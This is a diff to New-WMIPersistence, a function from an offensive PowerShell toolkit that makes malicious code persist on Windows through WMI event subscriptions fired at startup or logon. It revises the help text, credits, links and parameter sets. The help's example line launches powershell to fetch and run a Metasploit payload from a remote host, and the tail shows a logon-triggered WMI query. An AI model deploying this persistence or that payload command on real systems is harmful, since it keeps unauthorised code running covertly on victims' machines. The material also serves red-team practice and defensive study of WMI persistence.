@@ -1,7 +1,8 @@
 function New-WMIPersistence {
     <#
       .SYNOPSIS 
-      Creates persistence through WMI event subscriptions
+      Creates persistence through WMI event subscriptions. Based on work by @mattifestation and @harmj0y from
+      Empire and PowerSploit. 
 
       Author: Jared Haight (@jaredhaight)
       License: MIT License
@@ -23,8 +24,8 @@ function New-WMIPersistence {
       .PARAMETER OnStartup 
       Run the WMI event on Startup
       
-      .PARAMETER OnLogin
-      Run the WMI event on Login (Can't be used with OnStartup)
+      .PARAMETER OnLogon
+      Run the WMI event on Login
 
       .EXAMPLE 
       PS C:\> New-WMIPersistence -Name Update -OnStartup -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Arguments "-Command Invoke-MetasploitPayload example.com"
@@ -35,7 +36,13 @@ function New-WMIPersistence {
 
       .LINK 
       Script source can be found at https://github.com/jaredhaight/PowerPunch/blob/master/Persistence/New-WMIPersistence.ps1
-    
+      
+      .LINK
+      Original implementation in PowerSploit: https://github.com/PowerShellMafia/PowerSploit/blob/master/Persistence/Persistence.psm1
+
+      .LINK
+      Implentation in Empire: https://github.com/adaptivethreat/Empire/blob/master/lib/modules/persistence/elevated/wmi.py
+
     #>
 
 
@@ -49,10 +56,17 @@ function New-WMIPersistence {
 
         [string]$Arguments,
 
-        [switch]$OnStartup=$True,
+        [Parameter(ParameterSetName="OnStartup")]
+        [switch]$OnStartup,
 
-        [switch]$OnLogon=$False
+        [Parameter(ParameterSetName="OnLogon")]
+        [switch]$OnLogon
     )
+
+    if ($OnStartup -and $OnLogon) {
+        Write-Error "Can not use both OnStartup and OnLogon at the same time."
+        Break
+    }
 
     if ($OnLogon) {
         $query = "Select * from __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' and TargetInstance.LogonType = 2"
